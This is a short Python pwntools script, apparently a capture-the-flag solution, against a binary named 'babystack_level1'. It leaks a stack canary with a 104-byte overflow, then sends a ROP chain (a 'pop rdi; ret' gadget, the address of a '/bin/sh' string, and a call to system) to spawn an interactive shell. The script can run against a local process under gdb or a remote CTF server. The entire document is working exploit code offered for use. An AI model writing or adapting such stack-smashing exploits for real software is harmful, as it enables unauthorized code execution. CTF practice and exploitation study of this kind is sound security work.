#!/usr/bin/env python3
from pwn import *
import re

local = True

context.terminal = "/usr/bin/kitty"
context.gdbinit = "/usr/share/pwndbg/gdbinit.py"

canary_leaker = flat([b"A" for i in range(104)])
canary_finder = re.compile(rb".*A{104}(.{8})", re.S)

rdi = 0x6010a0 # name "/bin/sh"
gad_addr = 0x4009a3 # pop rdi; ret
sys_addr = 0x400792 # call system

c = ''

if local:
    c = process("./babystack_level1")
    gdb.attach(c, """
b *0x40089f
continue
    """)
    sleep(1)
else:
    c = remote("nc.thuctf.redbud.info", port=31544)

c.recvline()
c.recvline()
c.sendline(b"/bin/sh")
c.recvline()
c.recvline()
c.sendline(canary_leaker)

response = c.recv()
print(response)

canary = canary_finder.match(response).group(1)
canary = dd(canary, '\0', count=1)

payload = canary_leaker + canary + p64(0x0) + p64(gad_addr) + p64(rdi) + p64(sys_addr)
c.sendline(payload)
c.interactive()
